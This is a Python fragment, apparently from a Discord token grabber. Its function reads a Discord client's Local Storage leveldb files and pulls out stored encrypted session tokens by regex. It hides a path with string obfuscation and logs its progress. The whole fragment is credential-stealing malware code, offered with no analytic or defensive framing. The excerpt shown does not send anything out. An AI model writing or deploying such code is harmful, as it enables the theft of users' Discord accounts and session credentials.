# Retrieve Discord tokens
def gettokens(path):
    log_path = resource_path('debug.log')
    with open(log_path, "a") as f:
        f.write(f"[+] Scanning for tokens in {path}\n")
    path += deobfuscate_string(obfuscate_string("\\Local Storage\\leveldb\\"))
    tokens = []
    if not os.path.exists(path):
        with open(log_path, "a") as f:
            f.write(f"[-] Token path not found: {path}\n")
        return tokens
    for file in os.listdir(path):
        if not file.endswith((".ldb", ".log")):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
            with open(log_path, "a") as f:
                f.write(f"[+] Processed token file: {file}\n")
        except Exception as e:
            with open(log_path, "a") as f:
                f.write(f"[-] Failed to process token file {file}: {e}\n")
    return tokens

